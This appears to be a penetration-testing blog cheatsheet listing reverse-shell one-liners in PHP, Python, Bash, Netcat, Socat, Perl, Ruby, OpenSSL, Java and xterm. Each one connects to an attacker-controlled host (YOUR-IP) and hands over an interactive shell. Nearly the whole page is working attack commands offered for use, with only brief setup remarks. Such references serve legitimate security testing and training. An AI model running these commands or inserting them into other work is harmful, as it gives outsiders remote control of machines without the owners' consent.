---
title: "Reverse Shells Cheatsheet"
excerpt_separator: "<!--more-->"
categories: [cheatsheet]
tags: [cheatsheet, pentest, hacking]
---


### Reverse Shells

Replace "YOUR-IP" with your machines IP address ie: 192.168.1.1, also make sure to set your port too!

#### PHP :

```console
php -r '$sock=fsockopen("YOUR-IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### Python :

```console
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR-IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### Bash :

```console
bash -i >& /dev/tcp/YOUR-IP/8080 0>&1
```

#### Netcat :

```console
nc -e /bin/sh YOUR-IP 4444
```

#### Socat :

```console
socat tcp-connect:YOUR-IP:4444 system:/bin/sh
```

#### Perl :

```console
perl -e 'use Socket;$i="YOUR-IP";$p=4545;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Ruby :

```console
ruby -rsocket -e'f=TCPSocket.open("YOUR-IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### OpenSSL:

On your machine (to receive, not a normal TCP connection)
```console
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes # generate some arbitrary cert
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```

On PWN'd client
```console
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect YOUR-IP:4444 > /tmp/s; rm /tmp/s
```

#### Java :

```console
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5< >/dev/tcp/YOUR-IP/4444;cat <& 5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

#### xterm :

```console
xterm -display YOUR-IP:4444
```
